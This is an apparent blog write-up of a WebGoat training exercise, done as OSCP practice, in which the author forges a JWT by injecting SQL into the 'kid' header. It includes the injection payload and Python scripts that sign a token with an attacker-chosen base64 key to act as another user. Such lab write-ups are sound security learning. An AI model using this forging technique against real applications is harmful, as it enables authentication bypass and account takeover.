Title: Road to OSCP: WebGoat JWT final assignment
Date: 2020-02-24 14:00
Category: OSCP
Tags: websec, webgoat, python, jwt
Summary: Websec rookie's tough experience: final JWT assignment of WebGoat 8

Recently I decided to pursue OSCP certification and heard a lot of advices that it's a good practice to make some writeups on challenges you solved.
That's really new to me, but let's try and find out whether it help a little or not.


Previous assignments on JWT were kind of laid-back to me, nothing super-hard to be honest: breaking buisness logic flaw in signature verification process,
brute-forcing signing key by mounting dictionary attack (key was super popular, no need to possess pricey hardware on petabytes of wordlists) and exploiting
flaw in token refreshing mechanism. The last one was rather interesting as it was based on a writeup from bug-bounty program, much like a real-world experience.

But final one was not so easy, I stuck on it for a couple of days.

-----------------------------------------------------------------

Definition:
Given a form from two 'Twitter' accounts for Tom and Jerry you have to delete Tom's account by being authenticated as Jerry.


Bravely ignoring Occam's razor, I dived into Burp suite immediately trying to find endpoints that generate (and refresh) access tokens for Jerry, that was a mistake.
There were a couple of requests to another endpoints from other assignments which I conflated with endpoints for the final assignment. It took a while for me (dumb indeed) to
comprehend that I've traced artifacts from another assignments, which I already almost forgot because solved them a couple of days ago.
Answer to my question, there token is generated, was quite simple - on a server side and returned with a form itself. It was in a HTML body!
Before this turned out I've also tried to find some interactions in client scripts, still vainly.


**Lesson learned**: look before you leap. Just look into page sources first.


This indeed gave me no hints, task was not about bugs in token refreshing process. All right, lets decode the header and the claims:


The header:
```json
{
  "typ": "JWT",
  "kid": "webgoat_key",
  "alg": "HS256"
}
```

Claims:
```json
{
  "iss": "WebGoat Token Builder",
  "iat": 1524210904,
  "exp": 1618905304,
  "aud": "webgoat.org",
  "sub": "jerry@webgoat.com",
  "username": "Jerry", 
  "Email": "jerry@webgoat.com",
  "Role": ["Cat"]
}
```


So we've got a Jerry's credentials by default, Role claim seems to be used for authorization - Jerry is a mouse, and application indeed should check whether Jerry trying to
perform some actions not being a cat and respond to these attempts correspondingly. But application respond with something unusual: 

> io.jsonwebtoken.SignatureException: JWT signature does not match locally computed signature. JWT validity cannot be asserted and should not be trusted.


Our token is malformed and believed to be tampered. But what key used to check HMAC? I've tried to bruteforce it using a couple of dictionaries from [SecLists](https://github.com/danielmiessler/SecLists), but no luck.
What if we just change the algorithm in the header? Say for 'none' instead of HS256? Well, that does not either, application rejects such a token. Neither it allows a token without signature. 


So what do we have now?

1. We can't refresh token, it's just provided as is
2. At a glance we could not get rid of HMAC checks
3. Token used to delete both accounts, these buttons are even on the one form, nothing to eavesdrop from attempt to delete Jerry's account


What is unusual compared with previous assignments is a usage of 'kid' header. A little bit of googling and we know - it stands for key id and probably used to lookup for a key somewhere in the back-end.
I've tried to change it and noticed that it results in exception - `java.lang.IllegalArgumentException: Missing argument`. Yay! Chances are that it could be leveraged some way.  
And there I stuck. Message seemed to be unrelated to my input, whatever I wrote in there - single quotes, double quotes, parenthesis - result will be similar.  
I've tried to figure out what's going on but was not able to and turned to hints. All the hints but the last was useless. Last one gave a strict direction - there is a SQL injection via the kid header.

>  Use: hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS -- as the kid in the header and change the contents of the token to Tom and hit the endpoint with the new token  

Classic indeed. But that's does not work either! As any dumb no0b I was thinking that there is some kind of a bug in WebGoat and this assignment is un-solvable.  
I've tried to generate my own token using this little script:  
```python
import jwt

def main():
    data = {"iss": "WebGoat Token Builder",
            "iat": 1524210904,
            "exp": 1618995304,
            "aud": "webgoat.org",
            "sub": "tom@webgoat.com",
            "username": "Tom",
            "Email": "tom@webgoat.com",
            "Role":["Cat"]
            }
    secret = 'wipe'
    headers = {"kid": "hacked' union select 'wipe' -- "}
    ejwt = jwt.encode(data, secret, headers = headers, algorithm='HS256')
    print(ejwt)

if __name__ == '__main__':
    main()
``` 

Generated token didn't work, here is a common exception as above. But why? As far as I know query like `select 'foo'` should work almost in all the DBMS' but Oracle, where you need to provide `from dual`, otherwise it would be an error. Tried to add `from dual` to my header - no luck. Tried to used `from information_schema.tables` - and yes! That's was it. Sounds very easy, but I spent a lot of time here trying to figure out what's going on. Actually I did not grasp it, probably need to read the webgoat's sources. Neverhteless now I've got a message that my signature could not be verified. Damn why? I took a control over the key here, why didn't it verify? Am I missing something?  
It took me a day of trial and errors to find out why the key is invalid. Answer is quite simple - encoding. I was using plaintext secret in both injected query and in JWT generation, but as turned out application uses different format internally. It expects secret to be queried encoded in base64. This was really tough. Solution was quite simple:  
```python
import jwt

def main():
    data = {"iss": "WebGoat Token Builder",
            "iat": 1524210904,
            "exp": 1618995304,
            "aud": "webgoat.org",
            "sub": "tom@webgoat.com",
            "username": "Tom",
            "Email": "tom@webgoat.com",
            "Role":["Cat"]
            }
    secret = 'wipe'
    headers = {"kid": "hacked' union select 'd2lwZQ==' from information_schema.tables -- "}
    ejwt = jwt.encode(data, secret, headers = headers, algorithm='HS256')
    print(ejwt)

if __name__ == '__main__':
    main()
```
Little bit changed exp field, so that it would not suddenly expire right now.  
Long-awaited result:  
```json
{
  "lessonCompleted" : true,
  "feedback" : "Congratulations. You have successfully completed the assignment.",
  "output" : null
}
```

**Lesson learned**: Try harder, more experiments, less theoretical guesswork (but not always). 
